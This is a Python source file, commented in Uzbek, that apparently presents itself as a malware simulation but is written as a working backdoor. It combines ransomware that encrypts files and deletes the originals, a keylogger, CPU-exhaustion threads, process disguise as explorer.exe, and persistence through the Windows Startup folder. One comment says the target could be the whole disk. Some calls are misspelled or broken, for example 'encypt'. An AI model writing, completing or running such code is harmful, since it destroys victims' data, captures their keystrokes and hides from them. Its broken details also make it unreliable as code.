import os
import threading
import time 
import shutil
import psutil
import base64
from cryptography.fernet import Fernet
from pynput.keyboard import Listener # Keylogging uchun
import sys
import random

# Shifrlash kaliti (ransomware uchun)
key = Fernet.generate_key()
cipher = Fernet(key)
# Log fayli (keylogging uchun)
LOG_FILE = "keystrokes.txt"
def encypt_file(file_path):
    """"Faylni shiflash (ransomware simulyatsiyasi)"""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        encypted_data = cipher.encypt(file_data)
        with open(file_path + ".enc","wb") as f:
            f.write(encypted_data)
        os.remove(file_path) #Asl faylni o'chirish 
        return True
    except:
        return False

def ransomware():
    """Barch fayllarni shifrlash"""
    target_dir = "test_victim" # Sinov uchun papka (real hayotda butun disk bo'lishi mumkin)
    if not os.path.exists(target_dir):
        os.mkdir(target_dir)
        with open(os.path.join(target_dir,"example.text"),
        "w") as f:
            f.write("Bu sinov fayli!")
    for root, _, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root,file)
            if not file.endswith(".enc"):
                encypt_file(file_path)
    # Foydalanuvchiga xabar
    with open("README.txt","w") as f:
        f.write(f"Fayllaringiz shifrlangan! Kalit: {base64.b64encode(key).decode()}")


def keylogger():
    """Klaviatura bosimlarini yozib olish"""
    def on_press(key):
        with open(LOG_FILE,"a") as f:
            f.write(f"{time.ctime()} - {str(key)}\n")
    with Listener(on_press=on_press) as listener:
        listener.join()


def overload_system():
    """Tizimni qulflash yoki haddan tashqari yuklash"""
    def cpu_killer():
        while True:
            random.random() # CPUga yuklama 
    # 5 ta thread ochib, tizimni zo'riqtirish
    for _ in range(5):
        threading.Thread(target=cpu_killer, daemon=True).start()


def hide_process():
    """Jarayonni yashirish uchun nomni o'zgartirish"""
    try:
        psutil.Process().name = "explorer.exe" #Windowsda oddiy jarayon kabi ko'rinish
    except:
        pass

def persistence():
    """Tizim qayta ishga tushganda avtomatik ishga tushish"""
    if os.name == "nt": #Windows
        script_path = os.path.abspath(__file__)
        startup_path = os.path.join(os.getenv("APPDATA"),
    "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shutil.copy(script_path, startup_path + "\\system_update.py")

def backdoor_main():
    #Backdoor funksiyalarini ishga tushurish
    hide_process() # Jarayonni yashirish
    persistence() # Doimiy qolish
    # Har bir vazifani alohida threadda ishga tushirish
    threading.Thread(target=ransomware, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=overload_system, daemon=True).start()
    #Foydalanuvchidan yashirish uchun hech qanday  interfeys ko'rsatmaydi 
    while True:
        time.sleep(100) # Resurslardan foydalanishni kamaytirish

if __name__ == "__main__":
    # Backdoor fonda ishlaydi
    threading.Thread(target=backdoor_main, daemon=True).start()
    # Foydalanuvhi uchun hech qanday ko'rinish yo'q - yashirin ishlaydi
    while True:
        time.sleep(1000) #Dastur ochiq qoladi